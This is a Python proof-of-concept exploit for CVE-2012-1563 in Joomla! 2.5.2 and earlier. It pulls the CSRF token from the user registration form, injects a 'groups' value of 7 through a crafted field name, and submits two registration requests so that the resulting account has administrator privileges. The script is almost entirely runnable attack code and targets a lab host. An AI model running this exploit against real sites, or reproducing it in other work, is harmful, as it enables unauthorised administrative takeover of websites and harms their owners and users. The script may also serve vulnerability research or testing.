#!/usr/bin/python3
# CVE-2012-1563: Joomla! <= 2.5.2 Admin Creation
# cf

import bs4
import requests
import random


url = 'http://vmweb.lan/joomla-cms-2.5.2/'
form_url = url + 'index.php/using-joomla/extensions/components/users-component/registration-form'
action_url = url + 'index.php/using-joomla/extensions/components/users-component/registration-form?task=registration.register'

username = 'user%d' % random.randrange(1000, 10000)
email = username + '@yopmail.com'
password = 'ActualRandomChimpanzee123'

user_data = {
    'name': username,
    'username': username,
    'password1': password,
    'password2': password + 'XXXinvalid',
    'email1': email,
    'email2': email,
    'groups][': '7'
}

session = requests.Session()

# Grab original data from the form, including the CSRF token

response = session.get(form_url)
soup = bs4.BeautifulSoup(response.text, 'lxml')

form = soup.find('form', id='member-registration')
data = {e['name']: e['value'] for e in form.find_all('input')}

# Build our modified data array

user_data = {'%s]' % k: v for k, v in user_data.items()}
data.update(user_data)

# First request will get denied because the two passwords are mismatched

response = session.post(action_url, data=data)

# The second will work

data['jform[password2]'] = data['jform[password1]']
del data['jform[groups][]']
response = session.post(action_url, data=data)

print("Account created for user: %s [%s]" % (username, email))